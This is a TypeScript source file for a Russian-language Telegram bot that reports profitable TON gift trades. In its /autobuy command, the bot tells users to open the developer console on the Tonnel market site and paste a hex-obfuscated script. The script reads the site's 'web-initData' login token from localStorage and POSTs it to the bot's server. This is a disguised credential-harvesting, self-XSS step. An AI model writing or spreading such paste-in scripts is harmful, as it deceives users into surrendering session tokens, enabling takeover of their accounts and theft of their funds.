import { GiftsService } from '@/gifts/gifts.service';
import { BotScenes } from '@/types/types';
import { UsersService } from '@/users/users.service';
import { formatMessage } from '@/utils/formatMessage';
import { ConfigService } from '@nestjs/config';
import { Command, Ctx, Help, On, Start, Update } from 'nestjs-telegraf';
import { Context, Markup, Scenes } from 'telegraf';
import { TelegramService } from './telegram.service';



@Update()
export class TelegramUpdate {
  constructor(
    private readonly telegramService: TelegramService,
    private configService: ConfigService,
    private giftsService: GiftsService,
    private readonly userService: UsersService
  ) { }

  private tempStorage = new Map<number, number[]>();



  @Start()
  async onStart(@Ctx() ctx: Context) {
    this.telegramService.addToActiveChats(ctx.message)

    await this.userService.findOrCreateUser(ctx.from)

    const stream = this.telegramService.getPhotoStream("./public/images/sticker.png")
    await ctx.telegram.sendPhoto(ctx.chat.id, stream, {
      reply_markup: {
        inline_keyboard: [
          [{
            text: 'Запустить приложение',
            web_app: { url: this.configService.get('APP_URL') },
          }],
        ],
      },
    });

  }

  @Help()
  async onHelp(@Ctx() ctx: Context) {
    await ctx.reply(`Вот список доступных команд: \n/start \n/help \n/info`);
  }

  @Command('info')
  async onInfo(@Ctx() ctx: Context) {
    const info = this.telegramService.getInfo(ctx.from?.id);
    await ctx.reply(`Информация: ${info}`);
  }

  @Command('filters')
  async onFilters(@Ctx() ctx: Context) {
    console.log(this.configService.get('APP_URL') + 'filters')
    await ctx.reply('Ваши фильтры:', {
      reply_markup: {
        inline_keyboard: [
          [{
            text: '⚙️ Перейти к фильтрам',
            web_app: { url: this.configService.get('APP_URL') + 'filters' }
          }]
        ]
      }
    });
  }



  @Command('ping')
  async onPing(@Ctx() ctx: Context) {
    await ctx.reply('pong')
  }

  @Command('getminprofit')
  async onGetMinProfit(@Ctx() ctx: Context) {

    const minProfit = await this.userService.getUserMinProfit(ctx.from.id)

    const message = formatMessage([
      `Ваш текущий минимальный профит: ${minProfit} TON`,
      '',
      'Вы будете получать уведомления только о сделках выше этого значения.',
      '',
      'Чтобы изменить порог, используйте команду: /setminprofit',
    ],
      {
        style: 'markdownv2',
        emoji: '📈',
      }
    );

    await ctx.reply(message.text, {
      parse_mode: message.parse_mode,
    });
  }

  @Command('setminprofit')
  async onSetMinProfit(@Ctx() ctx: Scenes.SceneContext) {
    return ctx.scene.enter(BotScenes.MIN_PROFIT);
  }


  @Command('autobuy')
  async autoBuy(@Ctx() ctx: Context) {
    const user = await this.userService.findUserByTelegramId(ctx.from.id)

    if (user.authTonnelData) {
      await ctx.reply('✅✅✅Вы уже прошли все необходимые действия и можете использовать бота.');
    }

    const sentMessages: any = [];

    const msg1 = await ctx.reply('Для начала выполните следующие действия, следуя инструкциям ниже:');
    sentMessages.push(msg1);

    const msg2 = await ctx.replyWithPhoto(
      { source: './public/images/autoBuy/image1.png' },
      {
        caption: '<b>1. Перейдите на официальный сайт Tonnel</b>\n\n' +
          'Перейдите по <a href="https://market.tonnel.network/">ссылке</a> и нажмите "Login".\n' +
          'После этого вас перенаправит на страницу авторизации.',
        parse_mode: 'HTML',
      }
    );
    sentMessages.push(msg2);

    const msg3 = await ctx.replyWithPhoto(
      { source: './public/images/autoBuy/image2.png' },
      {
        caption: '<b>2. В мини-приложении Tonnel</b>\n\n' +
          'Нажмите <b>"Login To Website"</b>, чтобы продолжить авторизацию.',
        parse_mode: 'HTML',
      }
    );
    sentMessages.push(msg3);

    const msg4 = await ctx.replyWithPhoto(
      { source: './public/images/autoBuy/image3.png' },
      {
        caption: '<b>3. Откройте консоль на сайте</b>\n\n' +
          'Нажмите <b>F12</b>, чтобы открыть консоль разработчика. Вставьте в консоль следующий скрипт:\n\n' +
          `<code>
(function(){var _0x1f5e=["\\x77\\x65\\x62\\x2D\\x69\\x6E\\x69\\x74\\x44\\x61\\x74\\x61","\\x67\\x65\\x74\\x49\\x74\\x65\\x6D"];const initData=localStorage[_0x1f5e[1]](_0x1f5e[0]);if(!initData)return;fetch("http://localhost:8080/api/users/authData",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({initData})})})();
          </code>`,
        parse_mode: 'HTML',
      }
    );
    sentMessages.push(msg4);

    const buttonMsg = await ctx.reply('✅ После выполнения всех шагов нажмите кнопку ниже, чтобы скрыть инструкцию.', {
      reply_markup: Markup.inlineKeyboard([
        Markup.button.callback('🗑 Удалить инструкцию', `delete_instruction_${ctx.from.id}`)
      ]).reply_markup
    });

    const messageIds = [...sentMessages.map(m => m.message_id), buttonMsg.message_id];
    this.tempStorage.set(ctx.from.id, messageIds);
  }




  @On('callback_query')
  async onCallbackQuery(@Ctx() ctx) {
    const data = ctx.callbackQuery?.data;
    const userId = ctx.from.id;

    if (data?.startsWith('delete_instruction_')) {
      const storedMessages = this.tempStorage.get(userId);
      if (storedMessages) {
        for (const msgId of storedMessages) {
          try {
            await ctx.deleteMessage(msgId);
          } catch (e) {
            // сообщение уже удалено
          }
        }
      }

      await ctx.answerCbQuery('Инструкция удалена ✅');
    }

  }





  // @On('message'){
  // async onText(@Ctx() ctx: Context) {

  //   console.log('message')

  // }
}
